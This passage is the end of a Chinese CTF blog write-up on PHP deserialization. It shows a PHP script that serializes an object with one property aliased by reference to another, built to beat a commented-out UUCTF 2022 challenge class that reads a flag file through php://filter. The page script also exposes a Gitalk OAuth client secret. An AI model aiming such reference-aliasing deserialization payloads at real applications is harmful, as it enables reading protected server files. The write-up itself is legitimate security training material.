<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Clazz</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">//    public function __wakeup()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;a = file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;);</span><br><span class="line">//    &#125;</span><br><span class="line">//    public function __destruct()</span><br><span class="line">//    &#123;</span><br><span class="line">//        echo $this-&gt;b;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//@unserialize($_POST[&#x27;data&#x27;]);</span><br><span class="line">$c = new Clazz();</span><br><span class="line">$c-&gt;b=&amp;$c-&gt;a;</span><br><span class="line">echo serialize($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="UUCTF-2022-新生赛-ez-unser"><a href="#UUCTF-2022-新生赛-ez-unser" class="headerlink" title="[UUCTF 2022 新生赛]ez_unser"></a>[UUCTF 2022 新生赛]ez_unser</h1><p>1分<br>反序列化变量覆盖PHP<br>基本也是赋值地址的</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://web-wuk0ng.github.io/2025/06/15/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/">https://web-wuk0ng.github.io/2025/06/15/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">wuk0Ng</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/%E6%AF%94%E8%B5%9B/">
                                    <span class="chip bg-color">比赛</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/aliyunpay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <!-- 引入 Gitalk 官方 CSS（国内 CDN） -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
  <div class="comment_headling">
    <i class="fas fa-comments fa-fw"></i>
    <span>评论</span>
  </div>
  <div id="gitalk-container" class="card-content"></div>
</div>

<!-- 引入 Gitalk 官方 JS（国内 CDN） -->
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script>
  let gitalk = new Gitalk({
    clientID: 'Ov23liTNlK9NLcZwFSo8',
    clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
    repo: 'blog---comments',
    owner: 'web-wuk0Ng',
    admin: ["web-wuk0Ng"],
    id: '2025-06-15T18-00-00',
    distractionFreeMode: false
  });

  gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/06/15/%E7%9F%AD%E6%9C%9F%E7%B2%97%E6%9A%B4%E8%A7%84%E5%88%92/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="短期的一个粗暴规划">
                        
                        <span class="card-title">短期的一个粗暴规划</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-06-15
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
                                    记录
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
                        <span class="chip bg-color">比赛</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/06/12/%E9%BB%84%E6%B2%B3%E6%9D%AF2025ctf/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="黄河流域网络安全挑战赛2025">
                        
                        <span class="card-title">黄河流域网络安全挑战赛2025</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-12
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
                                    记录
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
                        <span class="chip bg-color">比赛</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2025</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">wuk0Ng</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
